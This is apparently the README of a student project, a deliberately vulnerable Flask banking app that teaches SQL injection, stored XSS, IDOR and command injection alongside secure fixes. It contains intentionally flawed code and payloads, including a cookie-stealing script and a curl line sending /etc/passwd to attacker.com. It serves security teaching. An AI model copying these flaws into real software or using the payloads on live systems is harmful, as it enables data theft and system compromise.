# RMIT NeoBank Loan Origination & Credit Bureau Gateway

**Educational Cybersecurity Project - RMIT University**

A complete Python Flask web application demonstrating both **secure coding practices** and **common web vulnerabilities** in a realistic banking loan origination system context.

---

## 📋 Table of Contents

- [Project Overview](#project-overview)
- [Business Context](#business-context)
- [Technology Stack](#technology-stack)
- [Security Features Demonstrated](#security-features-demonstrated)
- [Vulnerabilities Demonstrated](#vulnerabilities-demonstrated)
- [Installation & Setup](#installation--setup)
- [Usage Guide](#usage-guide)
- [Demo Scenarios](#demo-scenarios)
- [Security Analysis](#security-analysis)
- [Project Structure](#project-structure)
- [Academic Report Guidelines](#academic-report-guidelines)
- [License & Disclaimer](#license--disclaimer)

---

## 🎯 Project Overview

This project simulates a **real-world banking loan origination system (CAS)** integrated with a credit bureau gateway. It is designed for a university cybersecurity assignment to:

1. **Demonstrate secure coding practices** following OWASP guidelines
2. **Implement deliberate vulnerabilities** for educational analysis
3. **Show defense-in-depth security architecture**
4. **Provide hands-on experience** with attack and defense scenarios

The system models a multi-branch bank with:
- Branch-level loan application capture
- Head office credit assessment
- External credit bureau integration
- Role-based access control
- Complete audit trail

---

## 🏦 Business Context

### Real-World Parallels

This application is inspired by actual **banking loan origination systems (CAS)** used in:

- **Vietnam**: Credit Information Center (CIC) integration
- **International**: Experian, Equifax, TransUnion bureau integrations
- **Banking platforms**: Temenos, Finastra, Oracle FLEXCUBE

### Key Business Workflows

1. **Lead Capture** (Branch)
   - Branch officer creates loan application
   - Customer details, loan parameters
   - Initial status: DRAFT

2. **Application Processing** (Branch → HO)
   - Data verification
   - Document collection
   - Status: SUBMITTED

3. **Credit Assessment** (HO)
   - Credit bureau query (CIC/Experian)
   - Internal credit scoring
   - Automated decisioning based on score

4. **Approval/Rejection** (HO)
   - Final review by credit officer
   - Status: APPROVED / REJECTED
   - Loan disbursement (not implemented in this demo)

### Roles Modeled

| Role | Branch Code | Permissions |
|------|-------------|-------------|
| **Branch Officer** | HCM01, HN01, DN01 | View/create applications for their branch only |
| **HO Officer** | HO | View all branches, trigger credit checks, approve/reject |
| **Admin** | HO | Full system access, user management |

---

## 🛠 Technology Stack

| Component | Technology | Purpose |
|-----------|-----------|---------|
| **Backend** | Python 3.x, Flask 3.0 | Web framework |
| **Database** | SQLite, SQLAlchemy ORM | Data persistence |
| **Templates** | Jinja2 | Server-side rendering |
| **Frontend** | Bootstrap 5, Bootstrap Icons | Responsive UI |
| **Security** | Werkzeug (pbkdf2:sha256) | Password hashing |
| **Development** | Flask CLI | Database initialization |

---

## ✅ Security Features Demonstrated

### 1. Authentication & Session Management
- ✅ **Password hashing** (Werkzeug pbkdf2:sha256)
- ✅ **Secure session cookies** (Flask signed cookies)
- ✅ **Session validation** (active user check on each request)
- ✅ **Generic error messages** (prevents username enumeration)

### 2. Authorization & Access Control
- ✅ **Role-Based Access Control (RBAC)** via decorators
- ✅ **Horizontal access control** (branch-based data isolation)
- ✅ **Function-level access control** (HO-only operations)
- ✅ **Data-level authorization** (can_access_application check)

### 3. Input Validation & Sanitization
- ✅ **Parameterized queries** (SQLAlchemy ORM prevents SQL injection)
- ✅ **Type validation** (date, numeric, email formats)
- ✅ **Business rule validation** (age 18+, amount limits, tenure range)
- ✅ **File extension validation** (CSV only for bulk import)

### 4. Output Encoding & XSS Prevention
- ✅ **Auto-escaping** (Jinja2 default behavior)
- ✅ **Content Security Policy** (can be added via headers)
- ✅ **HTML entity encoding** for user-generated content

### 5. Secure File Handling
- ✅ **File upload via Flask** (no shell commands)
- ✅ **Safe filename generation** (server-controlled, prevents path traversal)
- ✅ **File size limits** (16MB max)
- ✅ **CSV parsing with Python library** (no external executables)

### 6. Audit & Logging
- ✅ **created_by, created_at** on all applications
- ✅ **Credit check audit trail** (who requested, when, results)
- ✅ **Status change tracking** (updated_at timestamps)

---

## ⚠️ Vulnerabilities Demonstrated

### 1. SQL Injection (CWE-89)

**Vulnerable Endpoint:** `/vuln/search`

**Code:**
```python
search_query = request.args.get("q", "")
raw_sql = f"""
    SELECT * FROM loan_applications
    WHERE applicant_name LIKE '%{search_query}%'
"""
result = db.session.execute(text(raw_sql))
```

**Attack Vector:**
```
Input: ' OR 1=1 --
Executed SQL: ... WHERE applicant_name LIKE '%' OR 1=1 --%'
Result: Returns ALL applications from ALL branches
```

**Impact:**
- Data breach (access all customer PII)
- Authentication bypass
- Data modification/destruction

**Secure Alternative:** Use SQLAlchemy ORM parameterized queries
```python
query.filter(LoanApplication.applicant_name.ilike(f"%{search}%"))
```

---

### 2. Stored XSS (CWE-79)

**Vulnerable Endpoint:** `/vuln/applications/<id>`

**Code:**
```jinja2
{# VULNERABLE: Disables auto-escaping #}
{{ application.remarks | safe }}
```

**Attack Vector:**
```html
Remarks field: <script>alert('XSS')</script>
Or: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**Impact:**
- Session hijacking (steal cookies)
- Credential theft (fake login forms)
- Malware distribution
- Phishing

**Secure Alternative:** Remove `|safe` filter, let Jinja2 auto-escape
```jinja2
{# SECURE: Auto-escaped #}
{{ application.remarks }}
```

---

### 3. Insecure Direct Object Reference (IDOR) (CWE-639)

**Vulnerable Endpoint:** `/vuln/applications/<id>`

**Code:**
```python
# NO access control check
application = LoanApplication.query.get_or_404(app_id)
return render_template("application_detail.html", application=application)
```

**Attack Vector:**
```
Branch HCM01 officer logged in
Legitimate access: /vuln/applications/1 (HCM01 branch)
IDOR attack: /vuln/applications/5 (HN01 branch) ← Should be blocked!
```

**Impact:**
- Horizontal privilege escalation
- Access to other branches' customer data
- Privacy violation (GDPR, regulatory fines)

**Secure Alternative:** Enforce branch-based access control
```python
if user.role == Role.BRANCH_OFFICER and application.branch_code != user.branch_code:
    abort(403)
```

---

### 4. Command Injection (CWE-78)

**Vulnerable Endpoint:** `/vuln/import`

**Code:**
```python
filename = request.form.get("filename")
command = f"python scripts/import_applications.py {filename}"
os.system(command)  # 🚨 VULNERABLE!
```

**Attack Vector:**
```bash
Input: data.csv; whoami
Executed: python scripts/import_applications.py data.csv; whoami

Input: data.csv & dir
Executed: python scripts/import_applications.py data.csv & dir

Input: x; curl http://attacker.com/exfil -d @/etc/passwd
```

**Impact:**
- Complete system compromise
- Data exfiltration
- Ransomware deployment
- Denial of service

**Secure Alternative:** Use file upload, no shell
```python
file = request.files.get("csv_file")
file.save(safe_path)
with open(safe_path) as f:
    reader = csv.DictReader(f)  # No shell!
```

---

## 📦 Installation & Setup

### Prerequisites

- Python 3.8 or higher
- pip (Python package manager)
- Git (optional, for cloning)
- Modern web browser (Chrome, Firefox, Edge)

### Step 1: Clone or Download

```bash
git clone <repository-url>
cd CyberComp_Asm2
```

Or download and extract the ZIP file.

### Step 2: Create Virtual Environment (Recommended)

**Windows:**
```powershell
python -m venv venv
.\venv\Scripts\Activate.ps1
```

**macOS/Linux:**
```bash
python3 -m venv venv
source venv/bin/activate
```

### Step 3: Install Dependencies

```bash
pip install -r requirements.txt
```

### Step 4: Initialize Database

```bash
# Set Flask app environment variable
$env:FLASK_APP="app"           # Windows PowerShell
# export FLASK_APP=app         # macOS/Linux

# Initialize database and create demo users
flask init-db
```

**Expected Output:**
```
📊 Database tables created successfully.
✅ Demo users created:
   Branch Users:
   - branch_hcm_01 / password123 (HCM01 branch)
   - branch_hn_01  / password123 (HN01 branch)
   - branch_dn_01  / password123 (DN01 branch)
   Head Office:
   - ho_credit_01  / password123 (HO credit officer)
   - ho_credit_02  / password123 (HO credit officer)
   Admin:
   - admin         / admin123    (System admin)

🚀 Database initialization complete!
```

### Step 5: Run the Application

```bash
flask run
```

Or:

```bash
python app.py
```

**Output:**
```
 * Running on http://127.0.0.1:5000
```

### Step 6: Access the Application

Open your web browser and navigate to:
```
http://127.0.0.1:5000
```

---

## 📖 Usage Guide

### Demo User Accounts

| Username | Password | Role | Branch | Description |
|----------|----------|------|--------|-------------|
| `branch_hcm_01` | `password123` | Branch Officer | HCM01 | Ho Chi Minh City branch |
| `branch_hn_01` | `password123` | Branch Officer | HN01 | Hanoi branch |
| `branch_dn_01` | `password123` | Branch Officer | DN01 | Da Nang branch |
| `ho_credit_01` | `password123` | HO Officer | HO | Head office credit analyst |
| `ho_credit_02` | `password123` | HO Officer | HO | Senior credit officer |
| `admin` | `admin123` | Admin | HO | System administrator |

### Basic Workflow

1. **Login** with any demo account
2. **Dashboard** shows statistics (branch-filtered for branch officers)
3. **Create Application** - Fill out loan application form
4. **View Applications** - List of applications (RBAC enforced)
5. **Trigger Credit Check** (HO only) - Simulates credit bureau query
6. **Explore Vulnerabilities** - Use "Security Demo" menu

---

## 🎬 Demo Scenarios

### Scenario 1: SQL Injection Attack

**Objective:** Demonstrate SQL injection to bypass access control

**Steps:**
1. Login as `branch_hcm_01` (HCM branch officer)
2. Navigate to **Security Demo > SQL Injection Demo**
3. In search box, enter: `' OR 1=1 --`
4. Click **Search (Vulnerable)**
5. **Observe:** You can now see applications from ALL branches (HCM01, HN01, DN01)
6. Compare with secure search: **Back to Secure Search** button

**Expected Result:**
- Vulnerable endpoint returns applications from all branches
- Secure endpoint shows only HCM01 applications
- Raw SQL query displayed showing injection point

---

### Scenario 2: Stored XSS Attack

**Objective:** Demonstrate stored XSS via remarks field

**Steps:**
1. Login as any user
2. Click **New Application**
3. Fill out form, in **Remarks** field enter:
   ```html
   <script>alert('XSS Attack - Session Stolen!')</script>
   ```
4. Click **Create Application**
5. Click **Vulnerable View** button on the created application
6. **Observe:** JavaScript alert popup appears (XSS executed)
7. Click **Secure View** button
8. **Observe:** Script is displayed as text, not executed

**Expected Result:**
- Vulnerable view: Alert popup (script executes)
- Secure view: Script displayed as text (safely escaped)

**Advanced XSS:**
```html
<script>
document.location='http://attacker.com/steal?cookie='+document.cookie
</script>
```

---

### Scenario 3: IDOR (Broken Access Control)

**Objective:** Access another branch's application by manipulating URL

**Steps:**
1. Login as `branch_hcm_01` (HCM branch)
2. Create an application (note its ID, e.g., ID=1)
3. Logout, login as `branch_hn_01` (HN branch)
4. Create an application (note its ID, e.g., ID=2)
5. In URL bar, navigate to: `http://127.0.0.1:5000/vuln/applications/1`
6. **Observe:** HN branch officer can view HCM branch application (IDOR)
7. Try secure endpoint: `http://127.0.0.1:5000/applications/1`
8. **Observe:** Access denied (RBAC enforced)

**Expected Result:**
- Vulnerable endpoint: No branch check, any user can view any application
- Secure endpoint: "Access Denied" message, redirected to applications list

---

### Scenario 4: Command Injection

**Objective:** Demonstrate OS command injection via bulk import

**Steps:**
1. Login as `ho_credit_01` (HO officer)
2. Navigate to **Security Demo > Command Injection Demo**
3. In filename field, enter: `data.csv; whoami`
4. Click **Execute (Vulnerable)**
5. **Observe:** System shows the command that would be executed
6. Try: `data.csv & dir` (Windows) or `data.csv; ls -la` (Linux)
7. Compare with **Secure Bulk Import** (file upload, no shell)

**Expected Result:**
- Vulnerable: Command string displayed showing injection
- Detection alert shown for shell metacharacters
- Secure: File upload form, no command execution

---

### Scenario 5: Secure Credit Bureau Integration

**Objective:** Demonstrate secure external API integration

**Steps:**
1. Login as `ho_credit_01` (HO officer)
2. Navigate to **Applications** list
3. Select any application (or create one first)
4. Click **View** (secure view)
5. Scroll to **Credit Bureau Checks** section
6. Click **Trigger Credit Bureau Check (Secure)**
7. **Observe:**
   - Random score generated (300-900)
   - Risk band determined (HIGH/MEDIUM/LOW)
   - Application status updated (APPROVED/REJECTED)
   - Audit trail created

**Expected Result:**
- Credit check record created
- Bureau reference, score, raw response stored
- Application status auto-updated based on score
- Full audit trail (who, when, result)

---

### Scenario 6: Secure Bulk Import

**Objective:** Demonstrate secure file upload and CSV parsing

**Steps:**
1. Login as `ho_credit_01` (HO officer)
2. Navigate to **Secure Bulk Import**
3. Create a CSV file `test_import.csv`:
   ```csv
   application_ref,applicant_name,national_id,dob,contact_phone,contact_email,product_code,requested_amount,tenure_months,branch_code,remarks
   TEST-001,Test User,123456789,1990-01-01,+84901111111,test@example.com,PL_SAL,10000000,24,HCM01,Test import
   ```
4. Upload the CSV file
5. Click **Upload & Import (Secure)**
6. **Observe:** Success message showing number of records imported

**Expected Result:**
- Applications created in database
- No shell commands executed
- Input validation applied to each row
- Error rows skipped with count

---

## 🔒 Security Analysis

### STRIDE Threat Model

| Threat | Vulnerability | Control | Endpoint |
|--------|--------------|---------|----------|
| **Spoofing** | Weak authentication | Password hashing (pbkdf2), session validation | `/login` |
| **Tampering** | SQL Injection | Parameterized queries (SQLAlchemy ORM) | `/applications` |
| **Repudiation** | No audit trail | created_by, created_at, timestamps | All write operations |
| **Information Disclosure** | IDOR, SQL Injection | RBAC, branch-based filtering | `/applications/<id>` |
| **Denial of Service** | File upload bombs | File size limits (16MB max) | `/secure/import` |
| **Elevation of Privilege** | IDOR, broken RBAC | @role_required, can_access_application() | All protected routes |

### OWASP Top 10 (2021) Coverage

| OWASP | Vulnerability | Implemented | Mitigated |
|-------|--------------|-------------|-----------|
| **A01:2021** | Broken Access Control | IDOR (`/vuln/applications/<id>`) | RBAC + data-level checks (`/applications/<id>`) |
| **A02:2021** | Cryptographic Failures | N/A (demo) | Password hashing (pbkdf2:sha256) |
| **A03:2021** | Injection | SQL Injection (`/vuln/search`), Command Injection (`/vuln/import`) | Parameterized queries, file upload |
| **A04:2021** | Insecure Design | Multiple vulnerabilities | Defense-in-depth architecture |
| **A05:2021** | Security Misconfiguration | N/A (demo) | SECRET_KEY, session config |
| **A06:2021** | Vulnerable Components | N/A | Up-to-date dependencies |
| **A07:2021** | Auth/Auth Failures | Weak session mgmt (demo) | Login required, role checks |
| **A08:2021** | Software/Data Integrity | N/A | Input validation, audit logs |
| **A09:2021** | Logging Failures | Limited logging | Audit trail in database |
| **A10:2021** | SSRF | N/A | Not applicable |

### Defense in Depth Layers

```
┌─────────────────────────────────────────────────────────────┐
│  Layer 1: Network Security (Not implemented in this demo)   │
│  - Firewall, IDS/IPS, DDoS protection                       │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│  Layer 2: Application Security (Implemented)                │
│  - Authentication (password hashing)                         │
│  - Session management (signed cookies)                       │
│  - RBAC (@role_required decorator)                          │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│  Layer 3: Input Validation (Implemented)                    │
│  - Parameterized queries (SQL injection prevention)          │
│  - File upload validation (command injection prevention)     │
│  - Type/range checks (business logic validation)            │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│  Layer 4: Data-Level Security (Implemented)                 │
│  - Horizontal access control (branch filtering)              │
│  - Output encoding (XSS prevention)                          │
│  - Audit logging (created_by, timestamps)                   │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│  Layer 5: Database Security (Partially implemented)         │
│  - Parameterized queries                                     │
│  - Foreign key constraints                                   │
│  - (Production: Encryption at rest, TDE)                    │
└─────────────────────────────────────────────────────────────┘
```

---

## 📁 Project Structure

```
CyberComp_Asm2/
│
├── app.py                      # Main Flask application
│   ├── Routes: Authentication (/login, /logout)
│   ├── Routes: Business logic (applications CRUD, credit checks)
│   ├── Routes: Vulnerable endpoints (/vuln/*)
│   ├── Routes: Secure endpoints (/applications, /secure/import)
│   └── CLI: Database initialization (flask init-db)
│
├── models.py                   # SQLAlchemy ORM models
│   ├── User (authentication, RBAC)
│   ├── LoanApplication (core business entity)
│   ├── CreditCheck (credit bureau integration audit)
│   └── Enums: Role, ApplicationStatus, CreditCheckStatus
│
├── security.py                 # Security utilities
│   ├── Password hashing/verification
│   ├── Session management (login_user, logout_user)
│   ├── Decorators (@login_required, @role_required)
│   └── Access control helpers (can_access_application)
│
├── credit_bureau_mock.py      # Mock external API
│   ├── perform_credit_check() - Simulates CIC/Experian
│   ├── validate_bureau_response() - Response validation
│   └── get_decisioning_recommendation() - Auto-decisioning
│
├── requirements.txt            # Python dependencies
│
├── templates/                  # Jinja2 HTML templates
│   ├── base.html              # Base layout (navbar, footer)
│   ├── login.html             # Login page
│   ├── dashboard.html         # Main dashboard
│   ├── applications_list.html # Applications list (secure search)
│   ├── application_new.html   # Create application form
│   ├── application_detail.html# View application (secure/vuln toggle)
│   ├── bulk_import.html       # Bulk import (secure/vuln)
│   └── attack_demo.html       # SQL injection demo page
│
├── static/
│   └── custom.css             # Banking-themed CSS
│
├── uploads/                   # Uploaded CSV files (created at runtime)
│
├── neobank_cas.db             # SQLite database (created by flask init-db)
│
└── README.md                  # This file
```

---

## 📝 Academic Report Guidelines

For your IEEE-style conference paper, consider this structure:

### 1. Abstract
- Background: Banking cybersecurity importance
- Objective: Demonstrate vulnerabilities and secure alternatives
- Methods: Implement CAS with deliberate flaws
- Results: Attack success rates, mitigation effectiveness
- Conclusion: Defense-in-depth is essential

### 2. Introduction
- Banking security landscape
- OWASP Top 10 relevance
- Project motivation and scope
- Contribution: Educational platform

### 3. Background & Related Work
- Loan origination systems (CAS)
- Credit bureau integration (CIC, Experian)
- OWASP Top 10 (2021)
- STRIDE threat modeling
- Previous academic research on web security

### 4. System Design & Architecture
- System overview (use case diagram)
- Database schema (ER diagram)
- User roles and permissions (RBAC matrix)
- Component diagram (Flask, SQLAlchemy, Jinja2)

### 5. Threat Analysis (STRIDE)
- **Spoofing:** Authentication mechanisms
- **Tampering:** Input validation, SQL injection
- **Repudiation:** Audit logging
- **Information Disclosure:** IDOR, XSS
- **Denial of Service:** File upload limits
- **Elevation of Privilege:** RBAC

### 6. Vulnerability Implementation & Exploitation
For each vulnerability:
- **Description:** What is it? (CWE reference)
- **Implementation:** Vulnerable code snippet
- **Exploitation:** Attack demonstration
- **Impact:** Business and technical consequences
- **Screenshots:** Before/after, attack payloads

Vulnerabilities to cover:
1. SQL Injection (CWE-89)
2. Stored XSS (CWE-79)
3. IDOR (CWE-639)
4. Command Injection (CWE-78)

### 7. Security Controls & Mitigation
For each vulnerability, show:
- **Control implementation:** Secure code snippet
- **How it works:** Technical explanation
- **Testing:** Verification that attack is blocked
- **Defense-in-depth:** Additional layers

### 8. Evaluation & Testing
- **Attack success rates:**
  - Vulnerable endpoints: 100% exploitable
  - Secure endpoints: 0% exploitable
- **Performance impact:** Minimal (ORM vs raw SQL)
- **Usability:** UX not compromised by security

### 9. Discussion
- **Lessons learned:** Common pitfalls
- **Real-world applicability:** Banking context
- **Limitations:** Educational scope (not production-ready)
- **Future work:** MFA, encryption at rest, WAF integration

### 10. Conclusion
- Summary of vulnerabilities and controls
- Importance of secure coding practices
- Defense-in-depth necessity
- Call to action: Integrate security early (DevSecOps)

### 11. References
- OWASP Top 10
- CWE database
- Banking security standards (Basel III, PCI DSS)
- Academic papers on web security
- Flask/SQLAlchemy documentation

---

## 🎤 Presentation Tips (6-7 Minutes)

### Slide Structure

1. **Title Slide** (15 sec)
   - Project name, your name, university, date

2. **Background & Motivation** (45 sec)
   - Why banking security matters
   - Real-world loan origination systems (CAS)
   - Project objectives

3. **System Overview** (45 sec)
   - Architecture diagram
   - Key components (Flask, SQLAlchemy, Bootstrap)
   - User roles (branch, HO, admin)

4. **Live Demo 1: SQL Injection** (60 sec)
   - Show vulnerable search
   - Demonstrate `' OR 1=1 --` attack
   - Show secure alternative

5. **Live Demo 2: Stored XSS** (60 sec)
   - Create application with malicious script
   - Show vulnerable view (alert popup)
   - Show secure view (escaped)

6. **Live Demo 3: IDOR** (45 sec)
   - Access another branch's application
   - Show access denied in secure version

7. **Defense in Depth** (45 sec)
   - Show security architecture layers
   - RBAC, input validation, output encoding
   - Audit logging

8. **STRIDE Threat Model** (30 sec)
   - Quick overview of threat coverage

9. **Results & Impact** (30 sec)
   - All attacks successful on vulnerable endpoints
   - All attacks blocked on secure endpoints
   - Performance: Negligible impact

10. **Conclusion & Q&A** (30 sec)
    - Key takeaways
    - Importance of secure coding
    - Open for questions

### Demo Tips
- **Practice timing:** Record yourself
- **Have backup:** Screenshots if live demo fails
- **Pre-create data:** Applications already in database
- **Browser tabs:** Pre-open all needed pages
- **Highlight code:** Use colored markers in IDE
- **Zoom in:** Make text readable to back of room

---

## ⚖️ License & Disclaimer

### Educational Use Only

This software is provided **"AS IS"** for **EDUCATIONAL PURPOSES ONLY**.

**⚠️ WARNING:** This application contains **INTENTIONAL SECURITY VULNERABILITIES** for demonstration purposes.

### DO NOT USE IN PRODUCTION

- ❌ Do not deploy to public internet
- ❌ Do not use with real customer data
- ❌ Do not use in actual banking systems
- ❌ Do not modify for commercial use without proper security review

### Recommended Environment

- ✅ Isolated VM or container
- ✅ Localhost only (127.0.0.1)
- ✅ Educational networks with instructor supervision
- ✅ Disconnected lab environments

### Legal Notice

The author and contributors are not responsible for:
- Misuse of this software
- Damage caused by deploying vulnerable code
- Regulatory violations
- Data breaches resulting from improper use

### Ethical Hacking Guidelines

When demonstrating attacks:
- Only attack your own systems
- Never use these techniques on systems you don't own
- Obtain written permission before penetration testing
- Follow responsible disclosure if you find real vulnerabilities
- Comply with all applicable laws (e.g., CFAA, Computer Misuse Act)

---

## 🤝 Contributing & Support

This is an educational project for RMIT University.

For questions or issues:
1. Review this README thoroughly
2. Check code comments (extensive documentation)
3. Consult with your course instructor
4. Review OWASP resources (https://owasp.org)

---

## 📚 Additional Resources

### Security Learning

- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **CWE Database:** https://cwe.mitre.org/
- **PortSwigger Web Security Academy:** https://portswigger.net/web-security
- **NIST Cybersecurity Framework:** https://www.nist.gov/cyberframework

### Banking Security Standards

- **PCI DSS:** Payment Card Industry Data Security Standard
- **Basel III:** International banking regulations
- **GDPR:** General Data Protection Regulation (EU)
- **CCPA:** California Consumer Privacy Act

### Tools for Security Testing

- **OWASP ZAP:** Web application security scanner
- **Burp Suite:** Intercepting proxy for web security testing
- **SQLMap:** Automated SQL injection tool
- **Nikto:** Web server scanner

---

## 🎓 Acknowledgments

- **RMIT University** for providing the assignment framework
- **OWASP Foundation** for security best practices
- **Flask Community** for excellent documentation
- **Bootstrap Team** for responsive UI framework

---

**Project Version:** 1.0  
**Last Updated:** December 2024  
**Author:** RMIT Cybersecurity Student  
**Course:** Cybersecurity Assignment 2  

---

**🚀 Ready to Explore?**

1. Run `flask init-db`
2. Run `flask run`
3. Open http://127.0.0.1:5000
4. Login with demo credentials
5. Start exploring secure and vulnerable endpoints!

**Remember:** This is a learning tool. Use responsibly and ethically! 🛡️
